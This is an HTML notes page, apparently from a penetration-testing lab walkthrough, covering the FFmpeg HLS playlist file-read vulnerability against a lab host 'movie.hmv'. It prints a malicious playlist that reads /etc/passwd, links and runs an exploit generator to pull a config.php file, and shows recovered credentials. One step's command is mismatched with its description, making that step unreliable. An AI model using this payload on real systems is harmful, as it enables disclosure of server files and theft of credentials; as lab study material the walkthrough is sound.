<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>4.1 FFMPeg</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>4.1 FFMPeg</h1><br/><p></p><p>There&#39;s a tool called “FFMPeg” to convert files from to differents formats.</p><p></p><p><strong>FFmpeg HLS vulnerability</strong></p><p>FFmpeg is an open source software used for processing audio and video formats. </p><p>You can use a malicious HLS playlist inside an AVI video to read arbitrary files.</p><p></p><p>The script creates an AVI that contains an HLS playlist. The playlist generated by this script looks like this:</p><p></p><p><div class="codebox"><pre><span style="color:#0000ff;font-weight:400">#EXTM3U</span><br /><span style="color:#0000ff;font-weight:400">#EXT-X-MEDIA-SEQUENCE:0</span><br /><span style="color:#0000ff;font-weight:400">#EXTINF:1.0</span><br /><span style="color:#a52a2a;font-weight:700">/</span>some<span style="color:#a52a2a;font-weight:700">/</span>txt<span style="color:#a52a2a;font-weight:700">/</span>file.txt<br /><span style="color:#0000ff;font-weight:400">#EXTINF:1.0</span><br /><span style="color:#a52a2a;font-weight:700">file:///</span>etc<span style="color:#a52a2a;font-weight:700">/passwd</span><br /><span style="color:#0000ff;font-weight:400">#EXT-X-ENDLIST</span></pre></div></p><p></p><p>There are several things to note about the way HLS playlists are processed:</p><p>• To process a playlist ffmpeg concatenates all segments and processes it as single file.</p><p>• To determine the type of this file FFmpeg uses the first segment of the playlist.</p><p>• FFmpeg processes txt files in a special way. It tries to show a screen capture of a tty printing this file.</p><p></p><p>   So, when FFmpeg sees playlist as above, it determines the type of whole file as .txt, then concatenates its&#39; content with the contents of /etc/passwd, and then &quot;plays&quot; it by drawing a tty that shows the contents.</p><p>   </p><p>1. Download the exploit from <a href="https://raw.githubusercontent.com/cujanovic/SSRF-Testing/master/ffmpeg/gen_avi.py">here</a>.   </p><p>    <div class="codebox"><pre>$ <span style="color:#a52a2a;font-weight:700">wget</span> http<span style="color:#a52a2a;font-weight:700">://</span>movie.hmv<span style="color:#a52a2a;font-weight:700">/</span>converted_videos<span style="color:#a52a2a;font-weight:700">/</span>config.mp4<br />$ <span style="color:#a52a2a;font-weight:700">chmod</span> 777 gen_avi.py</pre></div></p><p>   </p><p>2. Run the exploit as follows.</p><p>    <div class="codebox"><pre>$ python gen_avi.py <span style="color:#a52a2a;font-weight:700">file:///</span>var<span style="color:#a52a2a;font-weight:700">/</span>www<span style="color:#a52a2a;font-weight:700">/</span>html<span style="color:#a52a2a;font-weight:700">/</span>data<span style="color:#a52a2a;font-weight:700">/</span>config.php config.avi</pre></div></p><p></p><p>3. Go to the website and upload the “output.avi” file.</p><p>    <img src="images/1070-1.png" alt="images/1070-1.png" /></p><p>   </p><p>4. Download to the Kali Machine the converted file.</p><p>    <div class="codebox"><pre>$ <span style="color:#a52a2a;font-weight:700">wget</span> http<span style="color:#a52a2a;font-weight:700">://</span>movie.hmv<span style="color:#a52a2a;font-weight:700">/</span>converted_videos<span style="color:#a52a2a;font-weight:700">/</span>config.mp4</pre></div></p><p>    <span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1070-2.png" alt="images/1070-2.png" /></p><p></p><p>5. Open the file “config.mp4” with any Video Player.</p><p>    <img src="images/1070-3.png" alt="images/1070-3.png" /></p><p></p><p>    You&#39;ll get the credentials of an user:  <code>tarantino:killer</code></p><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div>
</body>
</html>
